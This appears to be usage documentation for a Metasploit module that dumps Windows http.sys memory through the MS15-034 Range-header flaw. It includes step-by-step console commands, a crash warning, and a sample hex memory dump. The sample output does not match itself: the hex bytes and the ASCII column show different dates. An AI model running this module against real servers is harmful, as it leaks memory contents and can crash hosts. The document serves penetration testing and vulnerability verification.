## Description

This module dumps memory contents using a crafted Range header and affects only Windows 8.1, Server 2012, and Server 2012R2. 

**Note:** If the target is running in VMware Workstation, this module has a high likelihood of resulting in BSOD; however, VMware ESX and non-virtualized hosts seem stable. Using a larger target file should result in more memory being dumped, and SSL seems to produce more data as well.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/ms15_034_http_sys_memory_dump```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

```
msf > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
msf auxiliary(ms15_034_http_sys_memory_dump) > set RHOSTS 10.1.1.125
RHOSTS => 10.1.1.125
msf auxiliary(ms15_034_http_sys_memory_dump) > set RPORT 80
RPORT => 80
msf auxiliary(ms15_034_http_sys_memory_dump) > exploit

[+] Target is vulnerable!
[+] Content length is 10240 bytes
[+] Stand by...
[+] Memory contents:
[*] 4854 5450 2f31 2e31 2032 3030 204f 4b0d    HTTP/1.1 200 OK.
[*] 0a43 6f6e 7465 6e74 2d54 7970 653a 2074    .Content-Type: t
[*] 6578 742f 6874 6d6c 0d0a 4c61 7374 2d4d    ext/html..Last-M
[*] 6f64 6966 6965 643a 204d 6f6e 2c20 3232    odified: Mon, 20
[*] 204a 756e 2032 3031 3520 3134 3a32 313a     Mar 2017 21:27:
[*] 3535 2047 4d54 0d0a 4163 6365 7074 2d52    55 GMT..Accept-R
[*] 616e 6765 733a 2062 7974 6573 0d0a 4554    anges: bytes..ET
[*] 6167 3a20 2261 3563 6663 3863 6166 3661    ag: "a5cfc8caf6a
[*] 6364 3031 3a30 220d 0a53 6572 7665 723a    cd01:0"..Server:
[*] 204d 6963 726f 736f 6674 2d49 4953 2f38     Microsoft-IIS/8
[*] 2e35 0d0a 582d 506f 7765 7265 642d 4279    .5..X-Powered-By
[*] 3a20 4153 502e 4e45 540d 0a00 0000 0000    : ASP.NET.......
[*] 0000 0202 4672 6167 0000 0000 0000 0000    ....Frag........
[*] c028 0000 0000 0000 0000 0000 0000 0000    .(..............
[*] 0200 0a00 4672 6565 0000 0000 0000 0000    ....Free........
[*] d01e f6c5 02f8 ffff 40a2 6502 00e0 ffff    ........@.e.....
[*] 0a00 0d02 4d64 6c20 0000 0000 0000 0000    ....Mdl ........
[*] 1000 6702 00e0 ffff 3800 0c00 0000 0000    ..g.....8.......
[*] 0000 0000 0000 0000 ba9a e501 00e0 ffff    ................
[*] 0090 e501 00e0 ffff 5c00 0000 ba0a 0000    ........\.......
[*] 59a8 1300 0000 0000 0000 0000 0000 0000    Y...............
[*] 0000 0000 0000 0000 0000 0000 0000 e0dc    ................
[*] 0d00 0d02 4d64 6c20 0000 0000 0000 0000    ....Mdl ........
[*] 9079 2602 00e0 ffff 3800 1c00 0000 0000    .y&.....8.......
...
...
...
[*] 6079 0702 00e0 ffff 0000 0000 0000 0000    `y..............
[*] 0e00 1902 5669 4d6d 0000 0000 0000 0000    ....ViMm........
[*] Suppressed 346 uninteresting lines
[*] Memory dump saved to /home/rw/.msf4/loot/20150622073911_default_10.1.1.125_iis.ms15034_145400.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ms15_034_http_sys_memory_dump) > 
```
